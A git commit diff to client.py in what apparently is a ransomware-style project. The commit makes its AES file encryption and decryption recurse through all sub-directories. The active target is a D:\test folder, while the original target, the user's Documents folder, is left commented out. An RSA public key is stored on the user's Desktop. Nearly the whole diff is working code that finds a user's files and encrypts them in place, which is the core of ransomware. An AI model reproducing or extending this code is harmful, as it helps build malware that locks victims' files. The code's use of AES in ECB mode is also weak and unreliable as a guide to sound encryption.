5fd9d6f7522dae14a102ef85c88458604d983c24
Omar0Tarek <omar.tarek.elabsawy@gmail.com>
2023-05-27 02:20:16 +0300

    Encrypt/Decrypt files in all sub-directories recursively

--- client.py
+++ client.py
@@ -22,7 +22,6 @@ def encrypt_aes(file_name, aes_key):
     file = open(file_name, mode='rb')
     plaintext = file.read()
     plaintext = pad(plaintext, BLOCK_SIZE)
-    print(plaintext)
     file.close()
 
     cipher = AES.new(aes_key, AES.MODE_ECB)
@@ -63,29 +62,46 @@ def encrypt_rsa(a_message, key):
 
 # Encrypting / Decrypting Files
 def encrypt_files(aes_key):
-    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
-    for file in os.listdir(directory):
-        filename = os.fsdecode(file)
-        if filename.endswith(".txt"):
-            file_full_path = os.path.join(directory.decode('UTF-8'), filename)
-            print(file_full_path)
-            encrypt_aes(file_full_path, aes_key)
+    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    print("Encrypted Files:")
+    directory = os.fsencode(f'D:\\test')
+    _encrypt_files(aes_key, directory)
 
+def _encrypt_files(aes_key, root_directory):
+    for file in os.listdir(root_directory):
+        full_path = os.path.join(root_directory, file)
+        if os.path.isdir(full_path):
+            _encrypt_files(aes_key, full_path)
+        else:
+            filename = os.fsdecode(file)
+            if filename.endswith(".txt"):
+                file_full_path = os.path.join(root_directory.decode('UTF-8'), filename)
+                print(file_full_path)
+                encrypt_aes(file_full_path, aes_key)
 
 def decrypt_files(aes_key):
-    directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
-    for file in os.listdir(directory):
-        filename = os.fsdecode(file)
-        if filename.endswith(".txt"):
-            file_full_path = os.path.join(directory.decode('UTF-8'), filename)
-            print(file_full_path)
-            decrypt_aes(file_full_path, aes_key)
+    # directory = os.fsencode(f'C:\\Users\\{USERNAME}\\Documents')
+    print("Decrypted Files:")
+    directory = os.fsencode(f'D:\\test')
+    _decrypt_files(aes_key, directory)
+
+def _decrypt_files(aes_key, root_directory):
+    for file in os.listdir(root_directory):
+        full_path = os.path.join(root_directory, file)
+        if os.path.isdir(full_path):
+            _decrypt_files(aes_key, full_path)
+        else:
+            filename = os.fsdecode(file)
+            if filename.endswith(".txt"):
+                file_full_path = os.path.join(root_directory.decode('UTF-8'), filename)
+                print(file_full_path)
+                decrypt_aes(file_full_path, aes_key)
 
 
 # Saving / Loading Public Key
 def store_public_key_on_desktop(public_key):
     file = open(
-        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'w')
+        f'C:\\Users\\{USERNAME}\\OneDrive\\Desktop\\PublicKey.key', 'w')
     public_key_bytes = public_key.export_key('PEM')
     public_key_str = public_key_bytes.decode("utf-8")
     file.write(public_key_str)
@@ -94,7 +110,7 @@ def store_public_key_on_desktop(public_key):
 
 def read_public_key_from_desktop():
     file = open(
-        f'C:\\Users\\{USERNAME}\\Desktop\\PublicKey.key', 'r')
+        f'C:\\Users\\{USERNAME}\\OneDrive\\Desktop\\PublicKey.key', 'r')
     public_key_str = file.read()
     public_key_bytes = public_key_str.encode("utf-8")
     key = RSA.import_key(public_key_bytes)
